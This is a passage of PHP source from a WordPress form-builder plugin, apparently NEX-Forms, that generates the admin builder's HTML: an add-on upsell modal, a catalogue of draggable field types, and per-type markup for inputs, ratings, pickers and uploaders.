			$output .= '<div class="modal fade in fade" id="getPdfAddon" tabindex="-1" role="dialog" aria-labelledby="myModalLabel" aria-hidden="true" style="z-index:10000000 !important;">
						  <div class="modal-dialog">
							<div class="modal-content">
							  <div class="modal-header alert alert-info">
								<button type="button" class="close" data-dismiss="modal" aria-hidden="true">&times;</button>
								<h4 class="modal-title" id="myModalLabel">Get Export to PDF add-on</h4>
							  </div>
							  <div class="modal-body">
									If you have a need to export your form entries to profesional looking PDF\'s then you need this add-on.<br />
<br />
<a class="btn btn-success" href="http://codecanyon.net/user/Basix/portfolio?ref=Basix" target="_blank">Get Export to PDF for NEX-Forms</a>
							  </div>
							  
							</div>
						  </div>
						</div>';
				
				
				/*$output .= '<div class="form_entries_panel center_panel" style="display:none;">';
					//$output .= '<div class="on_submit center_panel_button"><button class="btn btn-default active">On Submit</button></div>';
					//$output .= '<div class="hidden_fields center_panel_button"><button class="btn btn-default">Hidden Fields</button></div>';
					
					$output .= '<input type="hidden" name="page" value="'.$_REQUEST['page'].'">';
					$output .= '<input type="hidden" name="orderby" value="">';
					$output .= '<input type="hidden" name="order" value="desc">';
					$output .= '<input type="hidden" name="current_page" value="0">';

					
					$output .= '<div class="pagination-links"></div>';
				
					$output .= '<div class="close_panel"><button class="btn btn-default">&nbsp;&nbsp;<span class="btn-tx">Close</span>&nbsp;&nbsp;</button></div>';
					
					$output .= '<form name="do_csv_export" method="get" action="" id="posts-filter">';
					
						$output .= '<input type="hidden" name="export_nex_form" value="true">';
						$output .= '<input type="hidden" name="page" value="nex-forms-main">';
						$output .= '<input type="hidden" name="nex_forms_Id" value="0">';
						$output .= '<button type="submit" class="btn do_export" id="doaction" name=""><i class="fa fa-cloud-download"></i> <span class="btn-tx">Export to CSV</span></button>';
					$output .= '</form>';
					$output .= '<div class="form_entries_panel_content"></div>';
				$output .= '</div>';
				*/
				
				
				
				
				
				/* GLOBAL SETTINGS */
				
				
				
				$output .= '<div class="row outer_container">';
					
					
				
					
					//FIELDS
					
					
					
					/*$output .= '<div class="field-category-column col-xs-1">';
						$output .= '<a class="field-category form_fields">';
							$output .= '<i class="fa fa-star"></i> Form Fields';
						$output .= '</a>';
						
						/*$output .= '<a class="field-category selection_fields">';
							$output .= '<i class="fa fa-hand-o-up"></i> Select Fields';
						$output .= '</a>';*/
						
						
						/*$output .= '<a class="field-category preset_fields">';
							$output .= '<i class="fa fa-heart"></i> Preset Fields';
						$output .= '</a>';
						
						$output .= '<a class="field-category upload_fields">';
							$output .= '<i class="fa fa-cloud-upload"></i> Uploaders';
						$output .= '</a>';
						
						
						/*$output .= '<a class="field-category classic_fields">';
							$output .= '<i class="fa fa-heart"></i> Classic Fields';
						$output .= '</a>';*/
						
						/*$output .= '<a class="field-category other-elements">';
							$output .= '<i class="fa fa-code"></i> More Elements';
						$output .= '</a>';
						
					$output .= '</div>';*/
					
					$output .= '<div class="fields-column scroll-vertical  nf_tutorial_step_5 nf_tutorial " title="Form Elements Panel <span class=\'fa fa-close\'></span>" data-content="
					  		Click any of these form elements to add it into your form.<br><br>Note: you can categorise the elements for easy access.
							<div class=\'popover-footer\'>
								<div class=\'next_tut_step badge\'>
									<i class=\'fa fa-arrow-right\'></i>
								</div>
								<div class=\'prev_tut_step badge \'>
									<i class=\'fa fa-arrow-left\'></i>
								</div>
							</div>
						">';
						
							$output .= '<i class="fa fa-bars move_panel"></i><div class="panel_head" >';
								$output .= '
								
								<div class="dropdown field_selection">
								  <button id="dLabel" type="button" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
									<span class="shown-fields">All</span> <span class="fields_col_head">Fields</span> 
									<span class="caret"></span>
								  </button>
								  <ul class="dropdown-menu" aria-labelledby="dLabel">
									<li>
										<a href="#" data-show-field="all">All</a>
									</li>
									<li>
										<a href="#" data-show-field="preset">Preset</a>
									</li>
									<li>
										<a href="#" data-show-field="common">Common</a>
									</li>
									<li>
										<a href="#" data-show-field="selection">Selection</a>
									</li>
									<li>
										<a href="#" data-show-field="survey">Survey</a>
									</li>
									<li>
										<a href="#" data-show-field="upload">Upload</a>
									</li>
									<li>
										<a href="#" data-show-field="special">Special</a>
									</li>
									<li>
										<a href="#" data-show-field="html">HTML</a>
									</li>
									<li>
										<a href="#" data-show-field="button">Button</a>
									</li>
								  </ul>
								</div>
								
								';
							$output .= '</div>';
							$i=0;
							$output .= '<div class="inner">';
							
							
							//SET PREFERENCES
							$label_width = 'col-sm-12';
							$input_width = 'col-sm-12';
							$hide_label = '';
							$label_pos = 'left';
							$align_class = '';
							$preferences = get_option('nex-forms-preferences'); 							
							switch($preferences['field_preferences']['pref_label_align'])
								{
								case 'top':
									$label_width = 'col-sm-12';
									$input_width = 'col-sm-12';
								break;
								case 'left':
									$label_width = 'col-sm-3';
									$input_width = 'col-sm-9';
								break;
								case 'right':
									$label_width = 'col-sm-3';
									$input_width = 'col-sm-9';
									$label_pos = 'right';
									$align_class = 'pos_right';
								break;
								case 'hidden':
									$label_width = 'col-sm-12';
									$input_width = 'col-sm-12';
									$hide_label = 'style="display: none;"';
								break;
								default:
									$label_width = 'col-sm-12';
									$input_width = 'col-sm-12';
									$hide_label = '';
									$label_pos = 'left';
									$align_class = '';
								break;
								
								}
							
							
							
							$droppables = array
												(
										//FORM FIELDS
												'text' => array
													(
													'category'	=>	'common_fields',
													'label'	=>	'Single-line',
													'sub_label'	=>	'',
													'icon'	=>	'fa-minus',
													'type' => 'input',
													),
												'textarea' => array
													(
													'category'	=>	'common_fields',
													'label'	=>	'Multi-line',
													'sub_label'	=>	'',
													'icon'	=>	'fa-align-justify',
													'type' => 'textarea',
													),
												
												
												
												'select' => array
													(
													'category'	=>	'common_fields selection_fields',
													'label'	=>	'Select',
													'sub_label'	=>	'',
													'icon'	=>	'fa-arrow-down',
													'type' => 'select',
													),
												'multi-select' => array
													(
													'category'	=>	'selection_fields',
													'label'	=>	'Multi-Select',
													'sub_label'	=>	'',
													'icon'	=>	'fa-sort-amount-desc',
													'type' => 'multi-select',
													),
												'radio-group' => array
													(
													'category'	=>	'common_fields selection_fields',
													'label'	=>	'Radio Buttons',
													'sub_label'	=>	'',
													'icon'	=>	'fa-dot-circle-o',
													'type' => 'radio-group',
													),
												'check-group' => array
													(
													'category'	=>	'common_fields selection_fields',
													'label'	=>	'Check Boxes',
													'sub_label'	=>	'',
													'icon'	=>	'fa-check-square-o',
													'type' => 'check-group',
													),
												
												
												'single-image-select-group' => array
													(
													'category'	=>	'selection_fields',
													'label'	=>	'Thumb Select',
													'sub_label'	=>	'',
													'icon'	=>	'fa-image',
													'type' => 'single-image-select-group',
													),
												'multi-image-select-group' => array
													(
													'category'	=>	'selection_fields',
													'label'	=>	'Multi-Thumbs',
													'sub_label'	=>	'',
													'icon'	=>	'fa-image',
													'type' => 'multi-image-select-group',
													),
												
												'star-rating' => array
													(
													'category'	=>	'survey_fields',
													'label'	=>	'Star Rating',
													'sub_label'	=>	'',
													'icon'	=>	'fa-star',
													'type' => 'star-rating',
													),
												'thumb-rating' => array
													(
													'category'	=>	'survey_fields',
													'label'	=>	'Thumb Rating',
													'sub_label'	=>	'',
													'icon'	=>	'fa-thumbs-up',
													'type' => 'thumb-rating',
													),
												'smily-rating' => array
													(
													'category'	=>	'survey_fields',
													'label'	=>	'Smiley Rating',
													'sub_label'	=>	'',
													'icon'	=>	'fa-smile-o',
													'type' => 'smily-rating',
													),
												'digital-signature' => array
													(
													'category'	=>	'special_fields',
													'label'	=>	'Signature',
													'sub_label'	=>	'',
													'icon'	=>	'fa-pencil',
													'type' => 'digital-signature',
													),
												
												'tags' => array
													(
													'category'	=>	'special_fields',
													'label'	=>	'Tags',
													'sub_label'	=>	'',
													'icon'	=>	'fa-tag',
													'type' => 'tags',
													),
												'nf-color-picker' => array
													(
													'category'	=>	'special_fields',
													'label'	=>	'Color Picker',
													'sub_label'	=>	'',
													'icon'	=>	'fa-paint-brush',
													'type' => 'nf-color-picker',
													),
												'slider' => array
													(
													'category'	=>	'special_fields',
													'label'	=>	'Slider',
													'sub_label'	=>	'',
													'icon'	=>	'fa-sliders',
													'type' => 'slider',
													),	
												
												'date' => array
													(
													'category'	=>	'special_fields',
													'label'	=>	'Date',
													'sub_label'	=>	'',
													'icon'	=>	'fa-calendar-o',
													'type' => 'date',
													),
												'time' => array
													(
													'category'	=>	'special_fields',
													'label'	=>	'Time',
													'sub_label'	=>	'',
													'icon'	=>	'fa-clock-o',
													'type' => 'time',
													),
												'touch_spinner' => array
													(
													'category'	=>	'special_fields',
													'label'	=>	'Spinner',
													'sub_label'	=>	'',
													'icon'	=>	'fa-arrows-v',
													'type' => 'spinner',
													),
												'autocomplete' => array
													(
													'category'	=>	'special_fields',
													'label'	=>	'Auto-complete',
													'sub_label'	=>	'',
													'icon'	=>	'fa-pencil',
													'type' => 'autocomplete',
													),
												'password' => array
													(
													'category'	=>	'special_fields',
													'label'	=>	'Password',
													'sub_label'	=>	'',
													'icon'	=>	'fa-key',
													'type' => 'password',
													),
												
												
										//UPLOADER FIELDS
												'upload-multi' => array
													(
													'category'	=>	'upload_fields',
													'label'	=>	'Multi-Upload',
													'sub_label'	=>	'',
													'icon'	=>	'fa-files-o',
													'type' => 'upload-multi',
													),
												
												'upload-single' => array
													(
													'category'	=>	'upload_fields',
													'label'	=>	'File Upload',
													'sub_label'	=>	'',
													'icon'	=>	'fa-file-o',
													'type' => 'upload-single',
													),
												'upload-image' => array
													(
													'category'	=>	'upload_fields',
													'label'	=>	'Image Upload',
													'sub_label'	=>	'',
													'icon'	=>	'fa-image',
													'type' => 'upload-image',
													),
												
												/*'upload-multi' => array
													(
													'category'	=>	'upload_fields',
													'label'	=>	'Multi Upload',
													'sub_label'	=>	'',
													'icon'	=>	'fa-files-o',
													'type' => 'upload-multi',
													),*/
												
										//PRESET FIELDS		
												'name' => array
													(
													'category'	=>	'preset_fields',
													'label'	=>	'Name',
													'sub_label'	=>	'',
													'icon'	=>	'fa-user',
													'type' => 'preset_field',
													'format' => '',
													'required' => 'required',
													'field_name' => '_name',
													),	
												'surname' => array
													(
													'category'	=>	'preset_fields',
													'label'	=>	'Surname',
													'sub_label'	=>	'',
													'icon'	=>	'fa-user',
													'type' => 'preset_field',
													'format' => '',
													'required' => 'required',
													'field_name' => 'surname',
													),
												'email' => array
													(
													'category'	=>	'preset_fields',
													'label'	=>	'Email',
													'sub_label'	=>	'',
													'icon'	=>	'fa-envelope',
													'type' => 'preset_field',
													'format' => 'email',
													'required' => 'required',
													'field_name' => 'email',
													),	
												'phone_number' => array
													(
													'category'	=>	'preset_fields',
													'label'	=>	'Phone',
													'sub_label'	=>	'',
													'icon'	=>	'fa-phone',
													'type' => 'preset_field',
													'format' => 'phone_number',
													'required' => 'required',
													'field_name' => 'phone_number',
													),
												'url' => array
													(
													'category'	=>	'preset_fields',
													'label'	=>	'URL',
													'sub_label'	=>	'',
													'icon'	=>	'fa-link',
													'type' => 'preset_field',
													'format' => 'url',
													'required' => '',
													'field_name' => 'url',
													),	
												'address' => array
													(
													'category'	=>	'preset_fields',
													'label'	=>	'Address',
													'sub_label'	=>	'',
													'icon'	=>	'fa-map-marker',
													'type' => 'preset_field',
													'format' => '',
													'required' => '',
													'field_name' => 'address',
													),
												'Query' => array
													(
													'category'	=>	'preset_fields',
													'label'	=>	'Query',
													'sub_label'	=>	'',
													'icon'	=>	'fa-comment',
													'type' => 'preset_field',
													'format' => '',
													'field_name' => 'query',
													'required' => 'required'
													),
												/*'submit-button2' => array
													(
													'category'	=>	'submit',
													'label'	=>	'Submit',
													'sub_label'	=>	'',
													'icon'	=>	'fa-send',
													'type' => 'submit-button',
													),*/
												'submit-button' => array
													(
													'category'	=>	'button_fields common_fields preset_fields special_fields selection_fields',
													'label'	=>	'Button',
													'sub_label'	=>	'',
													'icon'	=>	'fa-send',
													'type' => 'submit-button',
													),
												);
							
							
							
							foreach($droppables as $type=>$attr)
								{
									$set_format = isset($attr['format']) ? $attr['format'] : '';
									$set_required  = isset($attr['required']) ? $attr['required'] : '';
									
									$output .= '<div class="field form_field all_fields '.$set_format.' '.$type.' '.$attr['category'].' '.(($set_required) ? 'required' : '').'"   >';
										
										$output .= '<div class="draggable_object "   >';
											$output .= '<i title="'.$attr['label'].'" data-toggle="tooltip" class="fa '.$attr['icon'].'"></i><span class="object_title">'.$attr['label'].'</span>';
										$output .= '</div>';
										
										$output .= '<div id="form_object" class="form_object" style="display:none;">';
											$output .= '<div class="row">';
												$output .= '<div class="col-sm-12" id="field_container">';
													$output .= '<div class="row">';
														if($attr['type']!='submit-button' && $attr['type']!='submit-button2')
															{
															if($label_pos != 'right')
																{
																$output .= '<div class="'.$label_width.' '.$align_class.' label_container '.(($preferences['field_preferences']['pref_label_text_align']) ? $preferences['field_preferences']['pref_label_text_align'] : 'align_left').'" '.$hide_label.'>';
																	$output .= '<label class="nf_title '.$preferences['field_preferences']['pref_label_size'].'"><span class="is_required glyphicon glyphicon-star btn-xs '.(($set_required) ? '' : 'hidden').'"></span><span class="the_label style_bold">'.$attr['label'].'</span><br /><small class="sub-text style_italic">'.(($preferences['field_preferences']['pref_sub_label']=='on') ? 'Sub label' : '').'</small></label>';
																$output .= '</div>';
																}
															}
																
																switch($attr['type'])
																	{
																	case 'smily-rating':
																		$output .= '<div class="'.$input_width.' input_container error_message" data-content="'.$preferences['validation_preferences']['pref_requered_msg'].'">';
																				$output .= '<label class="radio-inline " for="nf-smile-bad">
																							  <input class="nf-smile-bad the_input_element" type="radio" name="'.$nf_functions->format_name($attr['label']).'" id="nf-smile-bad" value="Bad">
																							  <span class="fa the-smile fa-frown-o nf-smile-bad" data-toggle="tooltip" data-placement="top" title="Bad">&nbsp;</span>
																						  </label>
																						  <label class="radio-inline" for="nf-smile-average">
																							  <input class="nf-smile-average the_input_element" type="radio" name="'.$nf_functions->format_name($attr['label']).'" id="nf-smile-average" value="Average">
																							  <span class="fa the-smile fa-meh-o nf-smile-average" data-toggle="tooltip" data-placement="top" title="Average">&nbsp;</span>
																						  </label>
																						  <label class="radio-inline" for="nf-smile-good">
																							  <input class="nf-smile-good the_input_element" type="radio" name="'.$nf_functions->format_name($attr['label']).'" id="nf-smile-good" value="Good">
																							  <span class="fa the-smile fa-smile-o nf-smile-good" data-toggle="tooltip" data-placement="top" title="Good">&nbsp;</span>
																						  </label>';
																		$output .= '</div>';
																	break;
																	case 'thumb-rating':
																		$output .= '<div class="'.$input_width.' input_container error_message" data-content="'.$preferences['validation_preferences']['pref_requered_msg'].'">';
																				$output .= '<label class="radio-inline" for="nf-thumbs-up">
																							  <input class="nf-thumbs-o-up the_input_element" type="radio" name="'.$nf_functions->format_name($attr['label']).'" id="nf-thumbs-up" value="Yes">
																							  <span class="fa the-thumb fa-thumbs-o-up" data-toggle="tooltip" data-placement="top" title="Yes">&nbsp;</span>
																						  </label>
																						  <label class="radio-inline" for="nf-thumbs-down">
																							  <input class="nf-thumbs-o-down the_input_element" type="radio" name="'.$nf_functions->format_name($attr['label']).'" id="nf-thumbs-down" value="No">
																							  <span class="fa the-thumb fa-thumbs-o-down" data-toggle="tooltip" data-placement="top" title="No">&nbsp;</span>
																						  </label>';
																		$output .= '</div>';
																	break;
																	case 'digital-signature':
																		if ( is_plugin_active( 'nex-forms-digital-signatures/main.php' ))
																			{
																			$output .= '<div class="'.$input_width.'  input_container">';
																					$output .= '<textarea  name="'.$nf_functions->format_name($attr['label']).'" class="the_input_element digital-signature-data error_message" data-content="'.$preferences['validation_preferences']['pref_requered_msg'].'"></textarea><div class="clear_digital_siganture"><span class="fa fa-eraser"></span></div><div class="js-signature"></div>';
																			$output .= '</div>';
																			}
																		else
																			{
																			$output .= '<div class="'.$input_width.'  input_container">';
																					$output .= '<div class="alert alert-success">You need the "<strong><em>Digital Signatures for NEX-forms</em></strong></a>" Add-on to use digital signatures! <br />&nbsp;<a href="http://codecanyon.net/user/basix/portfolio?ref=Basix" target="_blank" class="btn btn-success btn-large form-control">Buy Now</a></div>';
																			$output .= '</div>';
																			}
																	break;
																	case 'input':
																		$output .= '<div class="'.$input_width.'  input_container">';
																				$output .= '<input type="text" name="'.$nf_functions->format_name($attr['label']).'" class="form-control error_message the_input_element '.$preferences['field_preferences']['pref_input_size'].' '.$preferences['field_preferences']['pref_input_text_align'].'" data-maxlength-color="label label-success" data-maxlength-position="bottom" data-maxlength-show="false" data-default-value=""  data-onfocus-color="#66AFE9" data-drop-focus-swadow="1" data-placement="bottom" data-content="'.$preferences['validation_preferences']['pref_requered_msg'].'" data-secondary-message="" title="">';
																		$output .= '</div>';
																	break;
																	case 'textarea':
																		$output .= '<div class="'.$input_width.'  input_container">';
																			$output .= '<textarea name="'.$nf_functions->format_name($attr['label']).'" placeholder=""  data-maxlength-color="label label-success" data-maxlength-position="bottom" data-maxlength-show="false" data-default-value="" class="error_message the_input_element textarea pre-format form-control '.$preferences['field_preferences']['pref_input_size'].' '.$preferences['field_preferences']['pref_input_text_align'].'" data-onfocus-color="#66AFE9" data-drop-focus-swadow="1" data-placement="bottom" data-content="'.$preferences['validation_preferences']['pref_requered_msg'].'" title=""></textarea>';
																		$output .= '</div>';
																	break;
																	case 'select':
																		$output .= '<div class="'.$input_width.'  input_container">';
																			$output .= '<select name="'.$nf_functions->format_name($attr['label']).'" class="the_input_element error_message text pre-format form-control '.$preferences['field_preferences']['pref_input_size'].' '.$preferences['field_preferences']['pref_input_text_align'].'" data-content="'.$preferences['validation_preferences']['pref_requered_msg'].'">
																							<option value="0" selected="selected">--- Select ---</option>
																							<option>Option 1</option>
																							<option>Option 2</option>
																							<option>Option 3</option>
																						</select>';
																	$output .= '</div>';
																	break;
																	case 'multi-select':
																		$output .= '<div class="'.$input_width.'  input_container">';
																			$output .= '<select name="'.$nf_functions->format_name($attr['label']).'[]" multiple class="the_input_element error_message text pre-format form-control '.$preferences['field_preferences']['pref_input_size'].' '.$preferences['field_preferences']['pref_input_text_align'].'" data-content="'.$preferences['validation_preferences']['pref_requered_msg'].'">
																							<option value="0" selected="selected">--- Select ---</option>
																							<option>Option 1</option>
																							<option>Option 2</option>
																							<option>Option 3</option>
																						</select>';
																	$output .= '</div>';
																	break;
																	case 'radio-group':
																		$output .= '<div class="input_holder radio-group no-pre-suffix">';
																			$output .= '<div class="'.$input_width.' the-radios input_container error_message" id="the-radios" data-checked-color="" data-checked-class="fa-check" data-unchecked-class="" data-placement="bottom" data-content="'.$preferences['validation_preferences']['pref_requered_msg'].'" title="" >';
																				$output .= '<div class="input-inner">';
																					$output .= '<label class="radio-inline " for="radios_0">
																						  <input class="radio the_input_element" type="radio" name="'.$nf_functions->format_name($attr['label']).'" id="radios_0" value="Radio 1" >
																							  <span class="input-label radio-label">Radio 1</span>
																						  </label>
																						  <label class="radio-inline" for="radios_1">
																							  <input class="radio the_input_element" type="radio" name="'.$nf_functions->format_name($attr['label']).'" id="radios_1" value="Radio 2">
																							  <span class="input-label radio-label">Radio 2</span>
																						  </label>
																						  <label class="radio-inline" for="radios_2">
																							  <input class="radio the_input_element" type="radio" name="'.$nf_functions->format_name($attr['label']).'" id="radios_2" value="Radio 3" >
																							  <span class="input-label radio-label">Radio 3</span>
																						  </label>
																						';
																				$output .= '</div>';
																			$output .= '</div>';
																		$output .= '</div>';
																	break;
																	case 'check-group':
																		$output .= '<div class="input_holder radio-group">';
																			$output .= '<div class="'.$input_width.' the-radios input_container error_message" id="the-radios" data-checked-color="alert-success" data-checked-class="fa-check" data-unchecked-class="" data-placement="bottom" data-content="'.$preferences['validation_preferences']['pref_requered_msg'].'" title="" >';
																				$output .= '<div class="input-inner">';
																					$output .= '<label class="checkbox-inline" for="check_1">
																								  <input class="check the_input_element" type="checkbox" name="checks[]" id="check_1" value="Check 1" >
																								  <span class="input-label check-label">Check 1</span>
																							  </label>
																							  <label class="checkbox-inline" for="check_2">
																								  <input class="check the_input_element" type="checkbox" name="checks[]" id="check_2" value="Check 2">
																								  <span class="input-label check-label">Check 2</span>
																							  </label>
																							  <label class="checkbox-inline" for="check_3">
																								  <input class="check the_input_element" type="checkbox" name="checks[]" id="check_3" value="Check 3" >
																								  <span class="input-label check-label">Check 3</span>
																							  </label>';	
																				$output .= '</div>';
																			$output .= '</div>';
																		$output .= '</div>';
																	break;
																	
																	
																	
																	case 'single-image-select-group':
																		$output .= '<div class="input_holder ">';
																			$output .= '<div class="'.$input_width.' the-radios input_container error_message" id="the-radios" data-checked-color="" data-checked-class="fa-check" data-unchecked-class="" data-placement="bottom" data-content="'.$preferences['validation_preferences']['pref_requered_msg'].'" title="" >';
																	$output .= '<div class="input-inner" data-svg="demo-input-1">';
																	$output .= '<label class="radio-inline " for="radios-0"  data-svg="demo-input-1">
																			  <span class="svg_ready">
																			  <input class="radio svg_ready the_input_element" type="radio" name="radios" id="radios-0" value="1" >
																			  <span class="input-label radio-label">Radio 1</span>
																			  </span>
																		  </label>
																		  <label class="radio-inline" for="radios-1"  data-svg="demo-input-1">
																			<span class="svg_ready">
																			  <input class="radio svg_ready the_input_element" type="radio" name="radios" id="radios-1" value="2">
																			  <span class="input-label radio-label">Radio 2</span>
																			</span>
																		  </label>
																		 
																			';
																	
																	$output .= '</div>';
																			$output .= '</div>';
																		$output .= '</div>';
																	break;
																	
																	case 'multi-image-select-group':
																		$output .= '<div class="input_holder ">';
																			$output .= '<div class="'.$input_width.' the-radios input_container error_message" id="the-radios" data-checked-color="" data-checked-class="fa-check" data-unchecked-class="" data-placement="bottom" data-content="'.$preferences['validation_preferences']['pref_requered_msg'].'" title="" >';
																	$output .= '<div class="input-inner" data-svg="demo-input-1">';
																	$output .= '<label class="radio-inline " for="check-0"  data-svg="demo-input-1">
																			  <span class="svg_ready">
																			  <input class="radio svg_ready the_input_element" type="checkbox" name="checks" id="check-0" value="1" >
																			  <span class="input-label radio-label">Check 1</span>
																			  </span>
																		  </label>
																		  <label class="radio-inline " for="check-2"  data-svg="demo-input-1">
																			  <span class="svg_ready">
																			  <input class="radio svg_ready the_input_element" type="checkbox" name="checks" id="check-2" value="2" >
																			  <span class="input-label radio-label">Check 2</span>
																			  </span>
																		  </label>
																		  
																			';
																	
																	$output .= '</div>';
																			$output .= '</div>';
																		$output .= '</div>';
																	break;
																	
																	case 'star-rating':
																		$output .= '<div class="'.$input_width.'  input_container">';
																			$output .= '<div id="star" data-total-stars="5" data-enable-half="false" class="error_message svg_ready " style="cursor: pointer;" data-placement="bottom" data-content="'.$preferences['validation_preferences']['pref_requered_msg'].'" title=""></div>';
																		$output .= '</div>';
																	break;
																	case 'slider' :
																		$output .= '<div class="'.$input_width.'  input_container">';
																		$output .= '<div class="error_message slider" id="slider" data-fill-color="#f2f2f2" data-min-value="0" data-max-value="100" data-step-value="1" data-starting-value="0" data-background-color="#ffffff" data-slider-border-color="#CCCCCC" data-handel-border-color="#CCCCCC" data-handel-background-color="#FFFFFF" data-text-color="#000000" data-dragicon="" data-dragicon-class="btn btn-default" data-count-text="{x}"  data-placement="bottom" data-content="'.$preferences['validation_preferences']['pref_requered_msg'].'" title=""></div>';
																		$output .= '<input name="slider" class="hidden the_input_element the_slider" type="text">';
																		$output .= '</div>';
																	break;
																	case 'spinner' :
																		$output .= '<div class="'.$input_width.'  input_container">';
																		$output .= '<input name="spinner" type="text" id="spinner" class="error_message the_spinner the_input_element form-control '.$preferences['field_preferences']['pref_input_size'].' '.$preferences['field_preferences']['pref_input_text_align'].'" data-minimum="0" data-maximum="100" data-step="1" data-starting-value="0" data-decimals="0"  data-postfix-icon="" data-prefix-icon="" data-postfix-text="" data-prefix-text="" data-postfix-class="btn-default" data-prefix-class="btn-default" data-down-icon="fa fa-minus" data-up-icon="fa fa-plus" data-down-class="btn-default" data-up-class="btn-default" data-placement="bottom" data-content="'.$preferences['validation_preferences']['pref_requered_msg'].'" title="" data-onfocus-color="#66AFE9" data-drop-focus-swadow="1" />';
																		$output .= '</div>';
																	break;
																	case 'tags' :
																		$output .= '<div class="'.$input_width.'  input_container">';
																		$output .= '<input id="tags" value="" name="tags" type="text" class="tags error_message  the_input_element '.$preferences['field_preferences']['pref_input_size'].' '.$preferences['field_preferences']['pref_input_text_align'].'" data-max-tags="" data-tag-class="label-info" data-tag-icon="fa fa-tag" data-border-color="#CCCCCC" data-background-color="#FFFFFF" data-placement="bottom" data-content="Please enter a value" title="">';
																		$output .= '</div>';
																	break;
																	case 'nf-color-picker':
																		$output .= '<div class="'.$input_width.'  input_container"><div class="input-group colorpicker-component">';
																				$output .= '<input type="text" name="'.$nf_functions->format_name($attr['label']).'" class="form-control error_message the_input_element '.$preferences['field_preferences']['pref_input_size'].' '.$preferences['field_preferences']['pref_input_text_align'].'" data-maxlength-color="label label-success" data-maxlength-position="bottom" data-maxlength-show="false" data-default-value=""  data-onfocus-color="#66AFE9" data-drop-focus-swadow="1" data-placement="bottom" data-content="'.$preferences['validation_preferences']['pref_requered_msg'].'" data-secondary-message="" title="">';
																		$output .= '<span class="input-group-addon"><i></i></span></div></div>';
																	break;
																	case 'password' :
																		$output .= '<div class="'.$input_width.'  input_container">';
																		$output .= '<input id="" type="password" name="text_field" data-maxlength-color="label label-success" data-maxlength-position="bottom" data-maxlength-show="false" data-default-value="" maxlength="200" class="error_message svg_ready the_input_element text pre-format form-control '.$preferences['field_preferences']['pref_input_size'].' '.$preferences['field_preferences']['pref_input_text_align'].'" data-onfocus-color="#66AFE9" data-drop-focus-swadow="1" data-placement="bottom" data-content="'.$preferences['validation_preferences']['pref_requered_msg'].'" data-secondary-message="" title="">';
																		$output .= '</div>';
																	break;
																	
																	case 'autocomplete' :
																		$output .= '<div class="'.$input_width.'  input_container">';
																		$output .= '<input id="autocomplete" value="" name="autocomplete" type="text" class="error_message svg_ready form-control  the_input_element '.$preferences['field_preferences']['pref_input_size'].' '.$preferences['field_preferences']['pref_input_text_align'].'" data-onfocus-color="#66AFE9" data-drop-focus-swadow="1" data-text-color="#000000" data-border-color="#CCCCCC" data-background-color="#FFFFFF" data-placement="bottom" data-content="'.$preferences['validation_preferences']['pref_requered_msg'].'" title="">';
																		$output .= '<div style="display:none;" class="get_auto_complete_items"></div>';
																		$output .= '</div>';
																	break;
																	
																	case 'date' :
																		$output .= '<div class="'.$input_width.'  input_container">';
																			$output .= '<div class="input-group date" id="datetimepicker" data-format="MM/DD/YYYY" data-language="en">';
																				$output .= '<span class="input-group-addon prefix"><span class="fa fa-calendar-o"></span></span>';
																				$output .= '<input type="text" name="date" class="error_message form-control the_input_element '.$preferences['field_preferences']['pref_input_size'].' '.$preferences['field_preferences']['pref_input_text_align'].' " data-onfocus-color="#66AFE9" data-drop-focus-swadow="1" data-placement="bottom" data-content="'.$preferences['validation_preferences']['pref_requered_msg'].'" title="" />';
																			$output .= '</div>';
																		$output .= '</div>';
																	break;
																	case 'time' :
																		$output .= '<div class="'.$input_width.'  input_container">';
																			$output .= '<div class="input-group time" id="datetimepicker" data-format="hh:mm A" data-language="en">';
																				$output .= '<span class="input-group-addon prefix"><span class="fa fa-clock-o"></span></span>';
																				$output .= '<input type="text" name="time" class="error_message form-control the_input_element '.$preferences['field_preferences']['pref_input_size'].' '.$preferences['field_preferences']['pref_input_text_align'].'" data-onfocus-color="#66AFE9" data-drop-focus-swadow="1" data-placement="bottom" data-content="'.$preferences['validation_preferences']['pref_requered_msg'].'" title="" />';
																			$output .= '</div>';
																		$output .= '</div>';
																		
																	break;	
																	
																	case 'submit-button':
																		$output .= '<div class="col-sm-12  input_container">';
																			$output .= '<button class="nex-submit svg_ready the_input_element btn btn-default">Submit</button>';
																		$output .= '</div>';
																		$i=0;
																	break;
																	case 'submit-button2':
																		$output .= '<div class="col-sm-12  input_container">';
																			$output .= '<button class="nex-submit svg_ready the_input_element btn btn-default">'.$attr['label'].'</button>';
																		$output .= '</div>';
																		
																	break;
																	
																	case 'upload-multi':
																	
																		$output .= '<div class="'.$input_width.'  input_container">';
																			$output .= '<div class="fileinput fileinput-new" data-provides="fileinput">
																			  <div class="input-group">
																				<div class="the_input_element form-control '.$preferences['field_preferences']['pref_input_size'].' '.$preferences['field_preferences']['pref_input_text_align'].' uneditable-input span3 error_message" data-content="'.$preferences['validation_preferences']['pref_requered_msg'].'" data-secondary-message="'.$preferences['validation_preferences']['pref_invalid_file_ext_msg'].'" data-max-per-file-message="'.$preferences['validation_preferences']['pref_max_file_exceded'].'" data-max-all-file-message="'.$preferences['validation_preferences']['pref_max_file_af_exceded'].'" data-file-upload-limit-message="'.$preferences['validation_preferences']['pref_max_file_ul_exceded'].'" data-max-size-pf="0" data-max-size-overall="0" data-max-files="0" data-placement="bottom" data-trigger="fileinput"><i class="glyphicon glyphicon-file fileinput-exists"></i> <span class="fileinput-filename"></span></div>
																				<span class="input-group-addon btn btn-default btn-file postfix"><span class="glyphicon glyphicon-file"></span><input type="file" name="multi_file[]" multiple="" class="the_input_element"></span>
																				<a href="#" class="input-group-addon btn btn-default fileinput-exists" data-dismiss="fileinput"><span class="fa fa-trash-o"></span></a>
																				<div class="get_file_ext" style="display:none;">doc
docx
mpg
mpeg
mp3
mp4
odt
odp
ods
pdf
ppt
pptx
txt
xls
xlsx
jpg
jpeg
png
psd
tif
tiff</div>
																			  </div>
																			</div>';	
																		$output .= '</div>';
																	break;
																	
																	case 'upload-single':
																	
																		$output .= '<div class="'.$input_width.'  input_container">';
																			$output .= '<div class="fileinput fileinput-new" data-provides="fileinput">
																			  <div class="input-group">
